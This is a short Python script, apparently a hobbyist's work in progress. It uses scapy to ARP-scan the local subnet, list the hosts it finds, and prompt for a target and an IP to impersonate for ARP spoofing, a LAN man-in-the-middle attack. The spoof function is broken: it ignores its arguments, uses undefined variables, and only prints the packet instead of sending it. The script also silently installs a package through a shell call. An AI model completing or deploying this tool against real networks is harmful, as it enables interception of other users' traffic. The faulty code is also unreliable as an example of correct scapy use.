#!/usr/bin/python3
import scapy.all as scapy # use scapy.ls(function name) to list info about function
import sys,subprocess
try:
    import netifaces
except ModuleNotFoundError:
    subprocess.call("pip3 install netifaces",shell=True)


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # set destination mac to broadcast mac
    arp_request_broadcast_mac = broadcast_mac / arp_request
    answered_list = scapy.srp(arp_request_broadcast_mac,timeout=2, verbose=False)[0]

    client_list=[]
    for element in answered_list:
        client_dict = {"ip":element[1].psrc, "mac":element[1].hwsrc}
        client_list.append(client_dict)
    return client_list


def print_result(results_list):
    print("IP ADDRESS" + "\t\t MAC\n" + "="*45)
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=client["ip"], hwdst=client["mac"], psrc=ip)            
    print(packet.show())
        

gws=netifaces.gateways()
default_gateway = gws['default'][netifaces.AF_INET][0]
print("Default Gateway Detected : " + default_gateway)
print("\n\tArp Spoofing Clients\n" + "-" * 45 + "\n")
scan_results = scan(ip=default_gateway + "/24")
print_result(scan_results)
target_ip = input("Enter target ipaddress: ")
spoof_ip = input("Enter ip to spoof: ")

spoof(target_ip=target_ip,spoof_ip=spoof_ip)